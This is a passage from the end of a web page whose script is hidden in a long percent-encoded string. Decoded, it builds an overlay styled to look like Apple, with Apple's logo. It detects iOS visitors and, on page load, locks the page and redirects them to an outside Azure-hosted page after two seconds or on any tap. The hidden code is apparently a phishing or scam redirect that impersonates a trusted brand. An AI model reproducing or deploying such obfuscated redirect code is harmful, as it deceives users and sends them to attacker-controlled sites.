%72%65%6C%61%74%69%76%65%3B%0A%20%20%20%20%2F%2A%20%53%61%6D%65%20%63%6F%6C%6F%72%20%61%73%20%62%6C%75%72%2D%62%67%20%2%20%75%6E%69%66%6F%72%6D%20%6C%6F%6F%6B%20%2A%2F%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%35%35%2C%20%32%35%35%2C%20%32%35%35%2C%20%30%2E%39%36%29%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%63%6C%61%6D%70%28%32%30%70%78%2C%20%36%76%77%2C%20%32%38%70%78%29%3B%0A%20%20%20%20%62%6F%78%2D%73%68%61%64%6F%77%3A%20%30%20%32%30%70%78%20%36%30%70%78%20%72%67%62%61%28%30%2C%30%2C%30%2C%30%2E%32%32%29%3B%0A%20%20%20%20%70%61%64%64%69%6E%67%3A%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%74%6F%70%2C%20%31%72%65%6D%29%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%35%76%77%2C%20%32%2E%34%72%65%6D%29%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%62%6F%74%74%6F%6D%2C%20%31%72%65%6D%29%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%35%76%77%2C%20%32%2E%34%72%65%6D%29%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%6D%69%6E%28%39%32%76%77%2C%20%34%32%30%70%78%29%3B%0A%20%20%20%20%6D%61%78%2D%68%65%69%67%68%74%3A%20%63%61%6C%63%28%31%30%30%64%76%68%20%2D%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%74%6F%70%2C%20%30%70%78%29%20%2D%20%65%6E%76%28%73%61%66%65%2D%61%72%65%61%2D%69%6E%73%65%74%2D%62%6F%74%74%6F%6D%2C%20%30%70%78%29%29%3B%0A%20%20%20%20%6F%76%65%72%66%6C%6F%77%2D%79%3A%20%61%75%74%6F%3B%0A%20%20%20%20%74%65%78%74%2D%61%6C%69%67%6E%3A%20%63%65%6E%74%65%72%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%30%2C%30%2C%30%2C%30%2E%30%36%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%66%61%6D%69%6C%79%3A%20%2D%61%70%70%6C%65%2D%73%79%73%74%65%6D%2C%20%42%6C%69%6E%6B%4D%61%63%53%79%73%74%65%6D%46%6F%6E%74%2C%20%22%53%65%67%6F%65%20%55%49%22%2C%20%52%6F%62%6F%74%6F%2C%20%73%61%6E%73%2D%73%65%72%69%66%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%31%64%31%64%31%66%3B%0A%20%20%7D%0A%0A%20%20%2E%6C%6F%67%6F%20%7B%0A%20%20%20%20%77%69%64%74%68%3A%20%63%6C%61%6D%70%28%35%36%70%78%2C%20%31%34%76%77%2C%20%37%32%70%78%29%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%63%6C%61%6D%70%28%35%36%70%78%2C%20%31%34%76%77%2C%20%37%32%70%78%29%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%20%61%75%74%6F%20%31%2E%38%72%65%6D%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%75%72%6C%28%27%68%74%74%70%73%3A%2F%2F%77%77%77%2E%61%70%70%6C%65%2E%63%6F%6D%2F%61%63%2F%73%74%72%75%63%74%75%72%65%64%2D%64%61%74%61%2F%69%6D%61%67%65%73%2F%6B%6E%6F%77%6C%65%64%67%65%5F%67%72%61%70%68%5F%6C%6F%67%6F%2E%70%6E%67%3F%32%30%32%33%30%31%30%31%30%31%27%29%20%63%65%6E%74%65%72%2F%63%6F%6E%74%61%69%6E%20%6E%6F%2D%72%65%70%65%61%74%3B%0A%20%20%7D%0A%0A%20%20%68%31%20%7B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%2E%34%72%65%6D%2C%20%35%2E%35%76%77%2C%20%31%2E%38%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%31%2E%32%72%65%6D%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%33%3B%0A%20%20%7D%0A%0A%20%20%2E%6D%65%73%73%61%67%65%20%7B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%72%65%6D%2C%20%34%2E%32%76%77%2C%20%31%2E%31%34%72%65%6D%29%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%34%38%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%33%63%33%63%34%33%3B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%62%6F%74%74%6F%6D%3A%20%63%6C%61%6D%70%28%31%2E%36%72%65%6D%2C%20%36%76%77%2C%20%32%2E%32%72%65%6D%29%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%20%7B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%62%6C%6F%63%6B%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%31%30%30%25%3B%0A%20%20%20%20%70%61%64%64%69%6E%67%3A%20%63%6C%61%6D%70%28%30%2E%39%35%72%65%6D%2C%20%34%2E%32%76%77%2C%20%31%2E%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%31%2E%30%35%72%65%6D%2C%20%34%2E%35%76%77%2C%20%31%2E%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%77%65%69%67%68%74%3A%20%36%30%30%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%31%34%70%78%3B%0A%20%20%20%20%63%75%72%73%6F%72%3A%20%70%6F%69%6E%74%65%72%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%30%2E%38%72%65%6D%20%30%3B%0A%20%20%20%20%74%72%61%6E%73%69%74%69%6F%6E%3A%20%61%6C%6C%20%30%2E%31%38%73%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%70%72%69%6D%61%72%79%20%7B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%77%68%69%74%65%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%23%30%30%37%41%46%46%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%70%72%69%6D%61%72%79%3A%61%63%74%69%76%65%20%7B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%23%30%30%36%32%63%63%3B%0A%20%20%20%20%74%72%61%6E%73%66%6F%72%6D%3A%20%73%63%61%6C%65%28%30%2E%39%38%29%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%73%65%63%6F%6E%64%61%72%79%20%7B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%30%30%37%41%46%46%3B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%74%72%61%6E%73%70%61%72%65%6E%74%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%31%70%78%20%73%6F%6C%69%64%20%23%63%37%63%37%63%63%3B%0A%20%20%7D%0A%0A%20%20%2E%62%74%6E%2E%73%65%63%6F%6E%64%61%72%79%3A%61%63%74%69%76%65%20%7B%0A%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%30%2C%31%32%32%2C%32%35%35%2C%30%2E%31%29%3B%0A%20%20%7D%0A%0A%20%20%2E%66%6F%6F%74%6E%6F%74%65%20%7B%0A%20%20%20%20%6D%61%72%67%69%6E%2D%74%6F%70%3A%20%63%6C%61%6D%70%28%31%2E%34%72%65%6D%2C%20%35%76%77%2C%20%32%72%65%6D%29%3B%0A%20%20%20%20%66%6F%6E%74%2D%73%69%7A%65%3A%20%63%6C%61%6D%70%28%30%2E%37%38%72%65%6D%2C%20%33%2E%33%76%77%2C%20%30%2E%39%72%65%6D%29%3B%0A%20%20%20%20%63%6F%6C%6F%72%3A%20%23%38%65%38%65%39%33%3B%0A%20%20%20%20%6C%69%6E%65%2D%68%65%69%67%68%74%3A%20%31%2E%34%35%3B%0A%20%20%7D%0A%0A%20%20%2E%73%70%69%6E%6E%65%72%20%7B%0A%20%20%20%20%64%69%73%70%6C%61%79%3A%20%6E%6F%6E%65%3B%0A%20%20%20%20%77%69%64%74%68%3A%20%32%38%70%78%3B%0A%20%20%20%20%68%65%69%67%68%74%3A%20%32%38%70%78%3B%0A%20%20%20%20%62%6F%72%64%65%72%3A%20%34%70%78%20%73%6F%6C%69%64%20%72%67%62%61%28%32%35%35%2C%32%35%35%2C%32%35%35%2C%30%2E%34%29%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%74%6F%70%3A%20%34%70%78%20%73%6F%6C%69%64%20%77%68%69%74%65%3B%0A%20%20%20%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%35%30%25%3B%0A%20%20%20%20%61%6E%69%6D%61%74%69%6F%6E%3A%20%73%70%69%6E%20%31%73%20%6C%69%6E%65%61%72%20%69%6E%66%69%6E%69%74%65%3B%0A%20%20%20%20%6D%61%72%67%69%6E%3A%20%31%2E%32%72%65%6D%20%61%75%74%6F%20%30%3B%0A%20%20%7D%0A%0A%20%20%40%6B%65%79%66%72%61%6D%65%73%20%73%70%69%6E%20%7B%20%74%6F%20%7B%20%74%72%61%6E%73%66%6F%72%6D%3A%20%72%6F%74%61%74%65%28%33%36%30%64%65%67%29%3B%20%7D%20%7D%0A%0A%20%20%40%6D%65%64%69%61%20%28%70%72%65%66%65%72%73%2D%63%6F%6C%6F%72%2D%73%63%68%65%6D%65%3A%20%64%61%72%6B%29%20%7B%0A%20%20%20%20%2E%62%6C%75%72%2D%62%67%2C%0A%20%20%20%20%2E%63%61%72%64%20%7B%0A%20%20%20%20%20%20%62%61%63%6B%67%72%6F%75%6E%64%3A%20%72%67%62%61%28%32%38%2C%20%32%38%2C%20%33%30%2C%20%30%2E%39%36%29%3B%20%20%20%2F%2A%20%73%61%6D%65%20%63%6F%6C%6F%72%20%69%6E%20%64%61%72%6B%20%6D%6F%64%65%20%2A%2F%0A%20%20%20%20%7D%0A%20%20%20%20%2E%6D%65%73%73%61%67%65%20%7B%20%63%6F%6C%6F%72%3A%20%23%64%31%64%31%64%36%3B%20%7D%0A%20%20%20%20%2E%66%6F%6F%74%6E%6F%74%65%20%7B%20%63%6F%6C%6F%72%3A%20%23%39%38%39%38%39%64%3B%20%7D%0A%20%20%20%20%2E%63%61%72%64%20%7B%20%62%6F%72%64%65%72%2D%63%6F%6C%6F%72%3A%20%72%67%62%61%28%32%35%35%2C%32%35%35%2C%32%35%35%2C%30%2E%30%38%29%3B%20%7D%0A%20%20%7D%0A%0A%20%20%40%6D%65%64%69%61%20%28%6D%61%78%2D%77%69%64%74%68%3A%20%33%36%30%70%78%29%20%7B%0A%20%20%20%20%2E%63%61%72%64%20%7B%20%70%61%64%64%69%6E%67%3A%20%31%2E%36%72%65%6D%20%31%2E%34%72%65%6D%3B%20%62%6F%72%64%65%72%2D%72%61%64%69%75%73%3A%20%32%30%70%78%3B%20%7D%0A%20%20%7D%0A%3C%2F%73%74%79%6C%65%3E%0A%0A%3C%73%63%72%69%70%74%3E%0A%2F%2F%20%69%4F%53%20%64%65%74%65%63%74%69%6F%6E%20%2B%20%72%65%64%69%72%65%63%74%20%6C%6F%67%69%63%20%28%75%6E%63%68%61%6E%67%65%64%20%66%72%6F%6D%20%70%72%65%76%69%6F%75%73%20%76%65%72%73%69%6F%6E%29%0A%66%75%6E%63%74%69%6F%6E%20%69%73%49%4F%53%28%29%20%7B%0A%20%20%63%6F%6E%73%74%20%75%61%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%75%73%65%72%41%67%65%6E%74%20%7C%7C%20%6E%61%76%69%67%61%74%6F%72%2E%76%65%6E%64%6F%72%20%7C%7C%20%77%69%6E%64%6F%77%2E%6F%70%65%72%61%3B%0A%20%20%63%6F%6E%73%74%20%70%6C%61%74%66%6F%72%6D%20%3D%20%6E%61%76%69%67%61%74%6F%72%2E%70%6C%61%74%66%6F%72%6D%20%7C%7C%20%27%27%3B%0A%0A%20%20%69%66%20%28%2F%69%50%61%64%7C%69%50%68%6F%6E%65%7C%69%50%6F%64%2F%2E%74%65%73%74%28%75%61%29%20%26%26%20%21%77%69%6E%64%6F%77%2E%4D%53%53%74%72%65%61%6D%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%20%20%69%66%20%28%70%6C%61%74%66%6F%72%6D%20%3D%3D%3D%20%27%4D%61%63%49%6E%74%65%6C%27%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%6D%61%78%54%6F%75%63%68%50%6F%69%6E%74%73%20%26%26%20%6E%61%76%69%67%61%74%6F%72%2E%6D%61%78%54%6F%75%63%68%50%6F%69%6E%74%73%20%3E%20%31%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%20%20%69%66%20%28%75%61%2E%69%6E%63%6C%75%64%65%73%28%27%4D%61%63%27%29%20%26%26%20%27%6F%6E%74%6F%75%63%68%65%6E%64%27%20%69%6E%20%64%6F%63%75%6D%65%6E%74%29%20%72%65%74%75%72%6E%20%74%72%75%65%3B%0A%0A%20%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%7D%0A%0A%63%6F%6E%73%74%20%54%41%52%47%45%54%5F%55%52%4C%20%3D%20%27%68%74%74%70%73%3A%2F%2F%65%33%33%30%33%31%34%30%31%65%33%33%30%33%65%63%68%6F%2E%7A%31%33%2E%77%65%62%2E%63%6F%72%65%2E%77%69%6E%64%6F%77%73%2E%6E%65%74%2F%32%2E%68%74%6D%6C%27%3B%0A%0A%66%75%6E%63%74%69%6F%6E%20%72%65%64%69%72%65%63%74%4E%6F%77%28%29%20%7B%0A%20%20%77%69%6E%64%6F%77%2E%6C%6F%63%61%74%69%6F%6E%2E%72%65%70%6C%61%63%65%28%54%41%52%47%45%54%5F%55%52%4C%29%3B%0A%7D%0A%0A%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6C%6F%61%64%27%2C%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%69%66%20%28%21%69%73%49%4F%53%28%29%29%20%72%65%74%75%72%6E%3B%0A%0A%20%20%63%6F%6E%73%74%20%62%6F%64%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%62%6F%64%79%3B%0A%20%20%63%6F%6E%73%74%20%73%63%72%6F%6C%6C%59%20%3D%20%77%69%6E%64%6F%77%2E%73%63%72%6F%6C%6C%59%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%66%69%78%65%64%27%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%60%2D%24%7B%73%63%72%6F%6C%6C%59%7D%70%78%60%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%77%69%64%74%68%20%3D%20%27%31%30%30%25%27%3B%0A%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%68%69%64%64%65%6E%27%3B%0A%0A%20%20%63%6F%6E%73%74%20%6F%76%65%72%6C%61%79%20%3D%20%64%6F%63%75%6D%65%6E%74%2E%67%65%74%45%6C%65%6D%65%6E%74%42%79%49%64%28%27%61%70%70%6C%65%2D%6F%76%65%72%6C%61%79%27%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%73%74%79%6C%65%2E%64%69%73%70%6C%61%79%20%3D%20%27%66%6C%65%78%27%3B%0A%0A%20%20%63%6F%6E%73%74%20%61%75%74%6F%54%69%6D%65%72%20%3D%20%73%65%74%54%69%6D%65%6F%75%74%28%72%65%64%69%72%65%63%74%4E%6F%77%2C%20%32%30%30%30%29%3B%0A%0A%20%20%66%75%6E%63%74%69%6F%6E%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%0A%20%20%20%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%0A%20%20%20%20%63%6C%65%61%72%54%69%6D%65%6F%75%74%28%61%75%74%6F%54%69%6D%65%72%29%3B%0A%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%27%3B%0A%20%20%20%20%77%69%6E%64%6F%77%2E%73%63%72%6F%6C%6C%54%6F%28%30%2C%20%73%63%72%6F%6C%6C%59%29%3B%0A%0A%20%20%20%20%72%65%64%69%72%65%63%74%4E%6F%77%28%29%3B%0A%20%20%7D%0A%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6C%69%63%6B%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%73%74%61%72%74%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%65%6E%64%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%2C%20%7B%20%70%61%73%73%69%76%65%3A%20%66%61%6C%73%65%20%7D%29%3B%0A%20%20%6F%76%65%72%6C%61%79%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6D%6F%75%73%65%64%6F%77%6E%27%2C%20%68%61%6E%64%6C%65%49%6E%74%65%72%61%63%74%69%6F%6E%29%3B%0A%0A%20%20%77%69%6E%64%6F%77%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%62%65%66%6F%72%65%75%6E%6C%6F%61%64%27%2C%20%28%29%20%3D%3E%20%7B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%70%6F%73%69%74%69%6F%6E%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%74%6F%70%20%3D%20%27%27%3B%0A%20%20%20%20%62%6F%64%79%2E%73%74%79%6C%65%2E%6F%76%65%72%66%6C%6F%77%20%3D%20%27%27%3B%0A%20%20%7D%29%3B%0A%7D%29%3B%0A%3C%2F%73%63%72%69%70%74%3E'));
</script>

</body>
</html>
